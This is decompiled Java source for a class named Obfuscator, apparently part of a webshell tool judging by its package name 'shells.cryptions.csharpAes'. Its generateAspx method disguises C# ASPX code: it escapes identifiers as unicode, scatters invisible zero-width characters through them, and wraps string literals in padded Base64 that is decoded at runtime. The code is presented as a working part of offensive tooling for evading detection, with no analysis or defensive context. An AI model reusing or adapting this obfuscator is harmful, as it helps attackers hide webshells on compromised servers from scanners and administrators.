//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.csharpAes;

import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Obfuscator {
    private static final Random random = new Random();
    private static final String BEHINDER = "";
    private static final List<String[]> invisibleChars = Arrays.asList(new String[]{"\\u200f", "\\U0000200f"}, new String[]{"\\u200c", "\\U0000200c"}, new String[]{"\\u180B", "\\U0000180B"}, new String[]{"\\u200d", "\\U0000200d"}, new String[]{"\\u200e", "\\U0000200e"}, new String[]{"\\ufeff", "\\U0000feff"});

    public Obfuscator() {
    }

    private static String replunicode(Matcher m, boolean isspace) {
        String old = m.group(1);
        StringBuilder newStr = new StringBuilder();
        char[] var4 = old.toCharArray();
        int var5 = var4.length;

        for(int var6 = 0; var6 < var5; ++var6) {
            char c = var4[var6];
            if (random.nextBoolean()) {
                newStr.append(String.format("\\u%04x", Integer.valueOf(c)));
            } else {
                newStr.append(String.format("\\U%08x", Integer.valueOf(c)));
            }

            if (isspace) {
                String[] invisiblePair = (String[])invisibleChars.get(random.nextInt(invisibleChars.size()));
                String invisible = invisiblePair[random.nextInt(2)];
                newStr.append(invisible);
            }
        }

        return m.group(0).replace(old, newStr.toString());
    }

    private static String unicode(String cs, boolean isspace) {
        Pattern pattern = Pattern.compile("[^\"]\\b([A-Z]\\w+)\\b");
        Matcher matcher = pattern.matcher(cs);
        StringBuffer result = new StringBuffer();

        while(matcher.find()) {
            matcher.appendReplacement(result, Matcher.quoteReplacement(replunicode(matcher, isspace)));
        }

        matcher.appendTail(result);
        return result.toString();
    }

    private static String replstr(Matcher m) {
        String old = m.group(0);
        if (old.length() == 2) {
            return old;
        } else {
            old = old.substring(1, old.length() - 1);
            String b64str = Base64.getEncoder().encodeToString(old.getBytes(StandardCharsets.UTF_8));
            char pad = '%';
            StringBuilder newStr = new StringBuilder();

            for(int i = 0; i < b64str.length(); ++i) {
                newStr.append(b64str.charAt(i));
                if (i < b64str.length() - 1) {
                    newStr.append(pad);
                }
            }

            return String.format("System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(\"%s\".Replace(\"%s\",\"\")))", newStr.toString(), pad);
        }
    }

    private static String rstr(String cs) {
        Pattern pattern = Pattern.compile("\".*?\"");
        Matcher matcher = pattern.matcher(cs);
        StringBuffer result = new StringBuffer();

        while(matcher.find()) {
            matcher.appendReplacement(result, Matcher.quoteReplacement(replstr(matcher)));
        }

        matcher.appendTail(result);
        return result.toString();
    }

    public static String generateAspx(String text, boolean isspace) {
        String src = unicode(rstr(text), isspace).replace("\n", "");
        return src;
    }
}
